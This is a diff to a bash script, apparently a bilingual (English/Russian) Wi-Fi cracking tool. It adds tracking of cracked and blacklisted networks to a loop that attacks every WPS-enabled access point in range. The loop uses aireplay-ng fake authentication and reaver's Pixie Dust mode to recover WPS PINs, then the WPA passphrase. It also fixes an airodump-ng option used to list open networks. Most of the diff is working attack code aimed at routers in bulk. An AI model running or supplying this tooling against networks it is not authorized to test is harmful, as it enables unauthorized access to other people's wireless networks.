@@ -3,6 +3,20 @@
 IFACE=""
 REPLY=""
 
+
+if [ -e "cracked.txt" ]; then
+	echo ""
+else
+	echo "" > cracked.txt
+fi
+
+if [ -e "blacklist.txt" ]; then
+	echo ""
+else
+	echo "" > blacklist.txt
+fi
+
+
 if [[ "$(locale | grep LANG | grep -o ru)" == "ru" ]]; then
 	LANGUAGE="Russian"
 else
@@ -153,7 +167,9 @@ declare -A Strings36
 Strings36["English"]="The password is not found. It is worth trying again."
 Strings36["Russian"]="Пароль не найден. Завершение работы. Рекомендуется попробовать ещё несколько раз."
 
-
+declare -A Strings37
+Strings37["English"]="WPS of this network is disabled or the network is included in Blacklist or in Cracked List. Skipping."
+Strings37["Russian"]="WPS для этой сети заблокирован, либо она присутствует в списке взломанных или в списке исключений. Пропускаем."
 
 
 function selectInterface {
@@ -323,28 +339,37 @@ function PixieDustAattack {
 			done < <(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $1}' | sed 's/,//')
 
 			for i in "${WPSS[@]}"; 
-			do 
-				echo ${Strings12[$LANGUAGE]}"$i";
+			do
+				echo ""
+				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
+				echo ${Strings12[$LANGUAGE]}"$i ($ESSID)";
 				echo ${Strings11[$LANGUAGE]}
-				sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
-	
-				sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
-				sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -K 1 | tee /tmp/reaver.pixiedust"
-
-				PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')
-
-				if [[ "$PIN" ]]; then
-					echo -e ${Strings13[$LANGUAGE]}"$PIN"
-
-					sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
-					sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"
-
-					cat /tmp/reaver.wpa | grep -E "\[\+\] WPS pin:"
-					cat /tmp/reaver.wpa | grep -E "WPA"
-					rm /tmp/reaver.wpa
-
+				isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
+				if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
+					echo -e ${Strings37[$LANGUAGE]}
 				else
-					echo ${Strings15[$LANGUAGE]}
+					sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
+		
+					sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
+					sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"
+
+					PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')
+
+					if [[ "$PIN" ]]; then
+						echo -e ${Strings13[$LANGUAGE]}"$PIN"
+
+						sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
+						sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"
+
+						cat /tmp/reaver.wpa | grep -E "\[\+\] WPS pin:"
+						cat /tmp/reaver.wpa | grep -E "WPA"
+						rm /tmp/reaver.wpa
+
+					else
+						echo ${Strings15[$LANGUAGE]}
+					fi
+ 
+					
 				fi
 			done
 		else
@@ -369,7 +394,7 @@ function PixieDustAattack {
 function showOpen {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Strings17[$LANGUAGE]}
-		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-forma csv"
+		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
 		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
 		if [[ "$NOPASS" ]]; then
 			echo -e ${Strings18[$LANGUAGE]}
